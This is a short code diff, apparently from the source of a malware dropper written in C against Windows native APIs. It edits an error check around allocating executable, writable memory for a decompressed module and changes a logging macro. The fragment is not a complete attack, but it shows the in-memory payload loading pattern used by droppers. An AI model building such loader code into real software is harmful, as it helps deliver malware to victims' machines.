@@ -98,7 +98,7 @@ ExecuteDropper(VOID)
 
     PVOID Module = NULL;
 
-    if (!NT_SUCCESS(NtAllocateVirtualMemory(NtCurrentProcess(), &Module, 0, &cbDecompressed, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
+    if (NT_ERROR(NtAllocateVirtualMemory(NtCurrentProcess(), &Module, 0, &cbDecompressed, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
         $DLOG1(DLG_FLT_ERROR, "NtAllocateVirtualMemory failed miserably");
 
         return FALSE;
@@ -172,7 +172,7 @@ ExecuteDropper(VOID)
         }
     }
 
-    $DLOG1(DLG_FLT_INFO, "Done");
+    $DLOG2(DLG_FLT_INFO, "Done");
 
     return TRUE;
 }
